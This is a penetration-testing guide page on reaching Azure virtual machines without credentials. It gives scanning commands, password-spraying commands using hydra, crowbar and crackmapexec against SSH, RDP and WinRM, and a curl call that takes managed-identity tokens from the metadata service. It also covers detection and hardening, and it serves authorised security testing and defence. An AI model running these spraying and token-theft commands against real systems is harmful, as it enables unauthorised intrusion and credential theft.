---
cstg_id: CSTG-AZURE-VIRTUAL-MACHINES-UNAUTH
title: "AZURE Virtual Machines - Unauthenticated Access"
provider: azure
service: virtual-machines
phase: unauthenticated
required_access: unauthenticated
required_permissions: []
tools:
  - nmap
  - masscan
  - shodan
  - censys
  - hydra
  - crowbar
  - nccgroup-azucar
  - microburst
references:
  - "https://learn.microsoft.com/en-us/azure/virtual-machines/overview"
  - "https://learn.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview"
  - "https://learn.microsoft.com/en-us/azure/bastion/bastion-overview"
  - "https://learn.microsoft.com/en-us/azure/virtual-machines/windows/connect-rdp"
  - "https://learn.microsoft.com/en-us/azure/virtual-machines/linux/ssh-from-windows"
  - "https://hackingthe.cloud/azure/"
  - "https://www.shodan.io/"
license: CC BY-SA 4.0
---

## Summary

This page covers what an external, unauthenticated party can discover and reach against Azure Virtual Machines (VMs) without any valid credentials or tenant access. Azure VMs are Infrastructure-as-a-Service compute instances that frequently expose management and application services to the public internet through a public IP address, a Public Load Balancer, or an Azure Bastion endpoint. The attacker objective at this phase is to map externally reachable VM surface, fingerprint operating systems and services, identify exposed management protocols (RDP/3389, SSH/22, WinRM/5985-5986), and find an unauthenticated foothold - an exposed application, an anonymous service, default or weak credentials, or an unpatched remotely exploitable service - that can be leveraged into initial access.

Because Azure VMs are addressable on the public IP space owned by Microsoft, they are continuously scanned by both research scanners (Shodan, Censys) and adversaries. Public IP ranges are published by Microsoft, and DNS labels follow predictable regional patterns (`<label>.<region>.cloudapp.azure.com`), making bulk discovery practical without any tenant authentication.

## Prerequisites

- No Azure credentials, subscription access, or tenant membership.
- Outbound internet access from the testing host.
- A defined scope: target public IP ranges, DNS names, or organisation identifiers authorised for testing. External testing of cloud VMs must respect the cloud provider's acceptable-use and penetration-testing policies; for Microsoft Azure, customer-initiated penetration testing of one's own resources is permitted under the Unified Penetration Testing Rules of Engagement and does not require pre-approval, but the tester must own or be authorised for the target resources.

## Enumeration

### Map provider IP space and resolve cloud DNS

Azure publishes its public IP ranges as a downloadable JSON service-tag file. Correlate in-scope addresses against these ranges to confirm a target sits in Azure and to identify the region.

```bash
# Microsoft publishes the Azure IP Ranges and Service Tags JSON (weekly file).
# Download the current "Public" cloud file and grep for the target /32 or CIDR.
curl -s "https://download.microsoft.com/download/.../ServiceTags_Public_<date>.json" \
  | jq '.values[] | select(.name=="AzureCloud.<region>") | .properties.addressPrefixes'

# Azure VM public DNS follows: <dns-label>.<region>.cloudapp.azure.com
# Resolve candidate labels for the target org/region:
for label in app web vpn jenkins gitlab rdp bastion; do
  host ${label}.eastus.cloudapp.azure.com
done
```

### Passive reconnaissance via public scan databases

```bash
# Shodan: find Azure-hosted hosts for an org, by org/ASN/SSL CN, exposing common mgmt ports
shodan search 'org:"Microsoft Azure" port:3389'
shodan search 'ssl.cert.subject.cn:"target.com" port:22'
shodan host <public-ip>

# Censys: certificates and services tied to *.cloudapp.azure.com
censys search 'services.tls.certificates.leaf_data.names: cloudapp.azure.com'
```

### Active port and service scanning

```bash
# Discovery sweep of in-scope ranges for common Azure VM management/app ports
masscan -p22,80,135,139,443,445,1433,3306,3389,5432,5985,5986,8080 <cidr> --rate 1000

# Service/version fingerprint + OS guess on live hosts
nmap -sV -O -p- --open -Pn <public-ip>

# Probe management protocols specifically
nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info <public-ip>   # RDP, may leak hostname/domain via NTLM
nmap -p22 --script ssh2-enum-algos,ssh-hostkey <public-ip>          # SSH
nmap -p5985,5986 --script http-title <public-ip>                    # WinRM
```

RDP's NTLM info script is particularly valuable: an exposed 3389 endpoint often discloses the NetBIOS computer name, DNS domain name, and forest/domain name in the NTLM challenge, which seeds Active Directory and tenant enumeration.

## Misconfigurations & Findings

- **Management ports exposed to the internet (0.0.0.0/0).** Network Security Group (NSG) rules or Azure Firewall rules allowing inbound 3389 (RDP), 22 (SSH), or 5985/5986 (WinRM) from `Internet`/`Any`. This is the single most common Azure VM exposure and the primary vector for brute force and exploitation of remote-access vulnerabilities.
- **Public IP assigned where none is needed.** VMs that only need internal or jump-host access but have a Standard/Basic Public IP directly attached.
- **No just-in-time (JIT) VM access.** Management ports left permanently open instead of being opened on demand via Microsoft Defender for Cloud JIT.
- **Azure Bastion not used.** Direct RDP/SSH exposure where Bastion (browser-based, no public IP on the VM) would eliminate the listening management port entirely.
- **Default or weak local credentials.** Predictable local admin usernames (e.g. `azureuser`, `adminuser`, `Administrator`) and weak passwords susceptible to spraying.
- **Unpatched remotely exploitable services.** OS/service versions vulnerable to pre-auth remote code execution (e.g. unpatched RDP, SMB, or exposed application stacks).
- **Information disclosure.** RDP NTLM info leaking domain/hostname; verbose application banners; exposed admin panels.

## Exploitation

### Credential spraying against exposed management protocols

Where RDP/SSH/WinRM are reachable, low-and-slow password spraying against discovered or common usernames can yield initial access. Spray a single weak password across many accounts to avoid lockouts.

```bash
# SSH spray (one password across discovered usernames)
hydra -L users.txt -p 'Winter2026!' ssh://<public-ip> -t 4 -W 30

# RDP spray
crowbar -b rdp -s <public-ip>/32 -u administrator -C passwords.txt

# WinRM (HTTP 5985)
crackmapexec winrm <public-ip> -u users.txt -p 'Company@123' --continue-on-success
```

### Exploiting an exposed application or service

A web application, database, or admin panel bound to the VM's public IP is in scope as an initial-access vector. Standard application testing applies; success here typically yields a shell in the OS context of the web/service process, from which the workload identity (see post-exploitation) becomes reachable.

### Pivoting an unauthenticated foothold to cloud identity

The critical Azure-specific outcome of any unauthenticated foothold on a VM (web RCE, SSH, etc.) is reaching the Instance Metadata Service (IMDS). Once any code execution exists on the VM, IMDS at `169.254.169.254` provides VM metadata and, if a managed identity is assigned, OAuth tokens for Entra ID. This converts a host-level compromise into cloud-plane access. The full technique is documented in [Post-Exploitation](../05-post-exploitation/azure-virtual-machines-post-exploitation.md).

```bash
# Run from a foothold shell on the VM - retrieve a token for ARM:
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Detection & Logging

- **Azure Activity Logs** do not record raw inbound network scans or in-OS logons, but they do record control-plane changes (NSG rule edits, public IP association, Bastion deployment) that precede or follow exposure.
- **NSG flow logs / Virtual Network flow logs** (sent to a Log Analytics workspace or storage) capture allowed/denied inbound connections and reveal scanning and spray traffic against management ports.
- **Microsoft Defender for Cloud** raises "Network mapping/port scanning detected", "Failed RDP/SSH brute-force", and "Successful brute-force" alerts derived from VM agent telemetry and flow logs, and flags management ports open to the internet as a recommendation.
- **In-guest logs**: Windows Security Event ID 4625 (failed logon) / 4624 (success); Linux `/var/log/auth.log` or `/var/log/secure` for SSH attempts. Forwarded to Microsoft Sentinel via the Azure Monitor Agent.
- **Entra ID sign-in logs** become relevant only after a managed-identity token is obtained and used.

## Remediation & Hardening

- Remove public IPs from VMs that do not require them; place workloads behind internal load balancers or private endpoints.
- Never expose RDP/SSH/WinRM to `Internet`. Use **Azure Bastion** for browser-based management with no public management port, or **Microsoft Defender for Cloud Just-in-Time VM access** to open ports only on demand for a limited time and source IP.
- Restrict NSG inbound rules to specific source IPs/service tags; default-deny inbound.
- Enforce strong, unique local credentials and disable password auth in favour of SSH keys / certificate auth where possible; integrate with Entra ID login for VMs.
- Keep OS and services patched; enable automatic guest patching.
- Enable Microsoft Defender for Servers for behavioural detection and JIT.
- Enforce account lockout / smart lockout and monitor flow logs for spray patterns.

## Tools

- **nmap / masscan** - port and service discovery, OS and protocol fingerprinting.
- **Shodan / Censys** - passive discovery of internet-exposed Azure VMs by org, certificate, or port.
- **hydra / crowbar / crackmapexec** - credential spraying against RDP/SSH/WinRM.
- **MicroBurst / Azucar** - Azure-focused recon tooling (more relevant once any credential is obtained).

## References

- Azure Virtual Machines overview - https://learn.microsoft.com/en-us/azure/virtual-machines/overview
- Network Security Groups overview - https://learn.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview
- Azure Bastion overview - https://learn.microsoft.com/en-us/azure/bastion/bastion-overview
- Connect to a VM with RDP - https://learn.microsoft.com/en-us/azure/virtual-machines/windows/connect-rdp
- Hacking the Cloud - Azure - https://hackingthe.cloud/azure/
- Azure IP Ranges and Service Tags - https://www.microsoft.com/en-us/download/details.aspx?id=56519
